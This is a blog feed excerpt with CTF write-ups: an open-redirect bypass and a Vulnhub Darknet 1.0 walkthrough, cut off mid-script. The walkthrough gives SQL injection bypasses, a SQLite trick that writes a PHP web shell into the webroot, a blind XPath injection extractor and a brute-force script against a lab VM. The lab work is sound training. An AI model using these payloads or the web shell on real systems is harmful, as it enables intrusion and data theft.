&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php"&gt;Level 13&lt;/a&gt; is actually
redirect to &lt;code&gt;ex13-task.php&lt;/code&gt;. I need to make the redirect point to an external page so that to another user
it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt; but are infact taken to another site&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/jNgQ4Ww.png" /&gt;
&lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
but that gives me an error. Hrmm... trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/QM7V8Dk.png"&gt;&lt;img alt="" src="http://i.imgur.com/QM7V8Dk.png" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Sure enough, that worked. That's it, the final flag.&lt;/p&gt;
&lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Vulnhub Darknet1.0 write up</title><link href="http://unlogic.co.uk/2015/06/08/vulnhub-darknet10-write-up/" rel="alternate"></link><updated>2015-07-08T18:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-06-08:2015/06/08/vulnhub-darknet10-write-up/</id><summary type="html">&lt;p&gt;[Darknet 1.0](&lt;a class="reference external" href="https://www.vulnhub.com/entry/darknet-10,120/"&gt;https://www.vulnhub.com/entry/darknet-10,120/&lt;/a&gt;) by &lt;a class="reference external" href="https://www.vulnhub.com/author/q3rv0,111/"&gt;q3rv0&lt;/a&gt;
isn't easy... for me anyway.&lt;/p&gt;
&lt;p&gt;With some help and lots of reading I did however get to the bottom of it.&lt;/p&gt;
&lt;p&gt;Here's my journey&lt;/p&gt;
&lt;div class="section" id="stage-1"&gt;
&lt;h2&gt;Stage 1&lt;/h2&gt;
&lt;p&gt;First things first: scan the target&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~#&lt;/span&gt; nmap -sV -p- 192.168.56.106
&lt;span class="go"&gt;
Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-03 12:57 BST
Nmap scan report for darknet.com (192.168.56.106)
Host is up (0.00017s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
57664/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:E5:9F:EC (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 second&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Not much to be had here other than a web server. Poking at the RPC ports
didn't give any results. Browsing to the IP shows me:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/b513tfj.png" /&gt;
&lt;p&gt;There's no &lt;code&gt;robots.txt&lt;/code&gt; so nothing left to do but run &lt;code&gt;dirbuster&lt;/code&gt; on it. Using the
&lt;code&gt;directory-list-2.3-medium.txt&lt;/code&gt; I'm rewarded with some directories and files that
might be of interest&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/dNQnSQy.png" /&gt;
&lt;p&gt;I downloaded the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file and took a look at it.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull&amp;#64;darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/pre&gt;
&lt;p&gt;Hrmm.. a virtual host configuration. I added &lt;code&gt;192.168.56.106 888.darknet.com&lt;/code&gt; to my local &lt;code&gt;/etc/hosts&lt;/code&gt;
and then pointed my browser to &lt;code&gt;888.darknet.com&lt;/code&gt; to be presented with this:&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/PcMHBLd.png" /&gt;
&lt;p&gt;Initial thoughts are SQLi, so  I started with some simple SQL injections to see
if my hunch is correct. Entering a username like &lt;code&gt;' or '1'='1&lt;/code&gt;
yields an &lt;em&gt;Ilegal&lt;/em&gt;[sic] message. So this means two things: 1) SQLi is very
probably here becasue 2) our input is filtered. I didn't fancy working out
what chars I can and can't use so I made a script to do that for me&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;testit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'http://888.darknet.com/index.php'&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'username=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;amp;password=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;amp;Action=Login'&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'.*Ilegal.*'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;Illegal'&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt; OK'&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;punctuation&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;testit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;which yielded the following as illegal characters.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
,       Illegal
-       Illegal
;       Illegal
&amp;lt;       Illegal
=       Illegal
&amp;gt;       Illegal
&lt;/pre&gt;
&lt;p&gt;everything else was fair game. Well almost everything, some SQL commands aren't
allowed either. But I've got enough to work with.
I have a good idea that &lt;code&gt;devnull&lt;/code&gt; is a valid user, so I'll try to use that
info. I enter &lt;code&gt;devnull'/*&lt;/code&gt; as a username hoping I am creating a query like
&lt;code&gt;SELECT * FROM users WHERE username='devnull'/* AND password='xxxx';&lt;/code&gt;. Hitting
the login button confirms my input is correct.&lt;/p&gt;
&lt;p&gt;I should mention here that the VM has a bug in it so that even if you get the sqli
right, it will redirect you back to &lt;code&gt;index.php&lt;/code&gt;.  Noticed this in Burp as it
was redirection to &lt;code&gt;main.php&lt;/code&gt; after the correct SQLi, but then
going back to &lt;code&gt;index.php&lt;/code&gt;. A full reinstall of the VM will fix this, or reverting to
an earlier snapshot will also work.&lt;/p&gt;
&lt;p&gt;Ok, so now I get&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-2"&gt;
&lt;h2&gt;Stage 2&lt;/h2&gt;
&lt;img alt="" src="http://i.imgur.com/joaBvqT.png" /&gt;
&lt;p&gt;Whatever I enter here just goes somewhere without any feedback. This is completely blind
and will be a bit of a challenge.&lt;/p&gt;
&lt;p&gt;While I was unaware of the bug I mentioned earier, I ended up entering a lot of different characters into the
login form. An interesting response comes when you enter &lt;code&gt;'&lt;/code&gt; for the username with any pass:
&lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This is the md5 of the password.
Using a number like &lt;code&gt;1&lt;/code&gt; for the password with &lt;code&gt;'&lt;/code&gt; as the username gives
this error &lt;code&gt;near &amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot;: syntax error&lt;/code&gt;
These errors indicate that this is in fact a SQLite DB. This information will help me with the admin console
as I now know what I am working with. This also confirms my earlier suspicion about what the query looks
like.&lt;/p&gt;
&lt;p&gt;One useful feature of SQLite that I can exploit in this case, is its ability to create files on disk.
To leverage this, I need to find is a folder where I have permission to write files to.
I ran &lt;code&gt;dirbuster&lt;/code&gt; again and now have a few directories to try&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/zlFz06Y.png" /&gt;
&lt;p&gt;In order to create a file with SQLite I need to attach the file in question as a database.
So I set about running commands like this&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
attach database '/home/devnull/public_html/test.php' as db;
drop table if exists db.test;
create table db.test(payload text);
insert into db.test(payload) values('&amp;lt;?php phpinfo(); ?&amp;gt;');
&lt;/pre&gt;
&lt;p&gt;From the Apache config I downloaded at the start, I know that the webroot is &lt;code&gt;/home/devnull/public_html&lt;/code&gt;,
so any directories I got back from dirbuster will be a subdirectory of that.
I try all the folders until I got a hit with the &lt;code&gt;img&lt;/code&gt; directory. So I've got a place to
create files, but the bad news is that &lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;eval&lt;/code&gt;, and its ilk are disabled.
This means no simple php shell. Boooo.&lt;/p&gt;
&lt;p&gt;Not to worry, I got this. I knocked up a quick PHP script to do some work for me&lt;/p&gt;
&lt;pre class="code php literal-block"&gt;
&lt;span class="x"&gt;if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;db&amp;quot;) {
    $dbhandler=new SQLite3(&amp;quot;/home/devnull/database/888-darknet.db&amp;quot;);

    $query = $dbhandler-&amp;gt;query(&amp;quot;SELECT * FROM login&amp;quot;);

    while($result=$query-&amp;gt;fetchArray()){
        print_r($result);
        print &amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
    }
}

if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;ls&amp;quot;) {
    $path = $_GET[&amp;quot;arg&amp;quot;];
    &amp;#64;chdir($path);
    $dir = &amp;#64;dir($path);
    while($d = $dir-&amp;gt;read()) {
        print $d.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
    }
}
if ($_GET[&amp;quot;cmd&amp;quot;] == &amp;quot;cat&amp;quot;) {
    $file = $_GET[&amp;quot;arg&amp;quot;];
    $fh = fopen($file, &amp;quot;r&amp;quot;);
    if ($fh) {
        while ($l = fgets($fh)) {
            print htmlspecialchars($l).&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
        }
        fclose($fh);
    } else { print &amp;quot;Cannot open &amp;quot;.$file.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;; }
}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I use this as the payload in the &lt;code&gt;INSERT&lt;/code&gt; statement.&lt;/p&gt;
&lt;p&gt;With the &lt;code&gt;cmd&lt;/code&gt; parameter I can now list directories and cat files. The database
details were added once I had got the details from the db file in the &lt;code&gt;includes&lt;/code&gt; folder.&lt;/p&gt;
&lt;p&gt;I scoped around the server a bit, looking in the usual interesting folders, seeing if there's
anything useful. Eventually I found something interesting in the Apache
config folder. There's another virtual host on this machine at &lt;code&gt;signal8.darknet.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Before I go on, I best mention &lt;a class="reference external" href="https://github.com/dotcppfile/DAws"&gt;DAws&lt;/a&gt; which
will make your life super easy. I crafted a file uploader in PHP which I put on the
server with the SQL admin trick above, and then uploaded the &lt;code&gt;DAws.php&lt;/code&gt; file. This
will drop a &lt;code&gt;php.ini&lt;/code&gt; on the server that allows you to run commands, and also create
a reverse shell to your host. &lt;strong&gt;Much&lt;/strong&gt; easier than what I did, but you learn new things
all the time. This will be the PHP script I'll be using going forward.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-3"&gt;
&lt;h2&gt;Stage 3&lt;/h2&gt;
&lt;p&gt;Ok, so now I'm looking at the list of Darknet staff. Clicking on the usernames will take
me to a php page showing me that user's email. While I ponder the significance of this
I check for a robots.txt file and this time there is one. It lists a directory
called &lt;code&gt;xpanel&lt;/code&gt; which prompts me for another username and password combo.
No SQLi here though I'm afraid. I cannot bruteforce this either. Well I &lt;em&gt;could&lt;/em&gt;
but I don't think I'll get a hit any time soon.&lt;/p&gt;
&lt;p&gt;Fastforward and I'm stuck. After chatting to &lt;em&gt;g0blin&lt;/em&gt; I get a hint that the &lt;code&gt;contact.php&lt;/code&gt; is
a key. I start attempting to inject stuff into the &lt;code&gt;id&lt;/code&gt; field. Eventually I notice that I am
not looking at the same DB. The ids don't match with what I saw before when I dumped the DB.
This is a new data store. But what is it?
SQL wasn't getting me anywhere so I leafed through books and notes and figured it could be
XML. If it is, it will most likely be something like &lt;code&gt;...user/id=1]&lt;/code&gt; Adding &lt;code&gt;][1&lt;/code&gt; at the end will
return the first and only result, and we should get the email as per normal.
Adding &lt;code&gt;[2&lt;/code&gt; will error and return nothing as there should only be one result. If this works
I can be fairly certain that this is an XPath query.&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/7jRrIo0.png" /&gt;
&lt;p&gt;Excellent, it worked. Now I need to figure out how to make use of this. XPath isn't
something I've come across very often.&lt;/p&gt;
&lt;p&gt;So I begin to experiment. First off I figured out if it's XPath V2 or XPath V1.
If entering &lt;code&gt;id=1 or count(//*)][1&lt;/code&gt; doesn't work, but &lt;code&gt;id=1 lower-case('A')][1&lt;/code&gt; does,
then it's XPath V2, otherwise it's XPath V1.&lt;/p&gt;
&lt;p&gt;While I played around with this something clicked in my head and I groked enough of XPi
(XPath injection) to get to the bottom of this. Using the truth from above we can
determine the xpath names using the &lt;code&gt;substring&lt;/code&gt; function. I wrote another python
script to do the heavy lifting&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;


&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'http://signal8.darknet.com/contact.php'&lt;/span&gt;
&lt;span class="n"&gt;payload_tpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1 and substring(name(&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;),&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;,1)='&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;'][1&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;
&lt;span class="n"&gt;cmp_pos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="n"&gt;carry_on&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;carry_on&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="n"&gt;carry_on&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;payload_tpl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cmp_pos&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;

        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'errorlevel'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;
            &lt;span class="n"&gt;carry_on&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;

    &lt;span class="n"&gt;cmp_pos&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'Path name:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So I ran this with the current path&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~/darknet#&lt;/span&gt; python xpath.py
&lt;span class="go"&gt;u
us
use
user
Path name: user&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and the parent path&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;root&amp;#64;kali:~/darknet#&lt;/span&gt; python xpath.py ..
&lt;span class="go"&gt;a
au
aut
auth
Path name: auth&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, that will help me get some more data from the file. I try to see if the
email field will work with &lt;code&gt;1]/email|auth[id=1&lt;/code&gt;. I need the &lt;code&gt;auth&lt;/code&gt; part because
without it the query will not close correctly in the main script, and this
makes sure the closing &lt;code&gt;]&lt;/code&gt; won't error.&lt;/p&gt;
&lt;p&gt;So now I should be able to get the username with &lt;code&gt;1]/username|auth[id=1&lt;/code&gt;.
Now let's try the password field. I tried &lt;code&gt;pass&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; before I realised we're dealing with another
language here. Thanks to the logins I know that the spanish for password is &lt;em&gt;clave&lt;/em&gt;.
&lt;code&gt;id=1]/clave|auth[id=1&lt;/code&gt; throws up the password! Result. Using these detail
I am able to login at &lt;code&gt;signal8.darknet.com/xpanel&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="stage-4"&gt;
&lt;h2&gt;Stage 4&lt;/h2&gt;
&lt;img alt="" src="http://i.imgur.com/TVG7WhQ.png" /&gt;
&lt;p&gt;Oooh a PHP editor! Sweet... yeah right. Clicking the link goes to a page that shows:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
Tr0ll Found

The requested URL /xpath/xpanel/edit.php was not found on this server.
&lt;/pre&gt;
&lt;p&gt;So after some manual digging nothing comes up. Time to break out &lt;code&gt;dirbuster&lt;/code&gt; again
to find &lt;code&gt;ploy.php&lt;/code&gt; which presents me with&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/DueLt5z.png" /&gt;
&lt;p&gt;It requires a file which it uploads, as well as a specific combination of checkboxes to be checked.
Just trying some random checkboxes I can determine that the correct number of boxes is 4,
but instead of trying this all manually, I'll script this part.
Looking at the source of the page I see the values for the checkboxes.
All I have to do is iterate of all possible combinations of 4 of these numbers.&lt;/p&gt;
&lt;p&gt;Here's my bruteforce script:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;

&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'devnull'&lt;/span&gt;
&lt;span class="n"&gt;passwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'j4tC1P9aqmY'&lt;/span&gt;

&lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'http://signal8.darknet.com/xpanel/'&lt;/span&gt;

&lt;span class="n"&gt;login_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;'index.php'&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'password'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;sess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;login_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;ploy_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base_url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;'ploy.php'&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;itertools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;permutations&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;37&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;22&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;12&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;72&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;59&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;17&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;99&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;'Action'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;'Upload'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
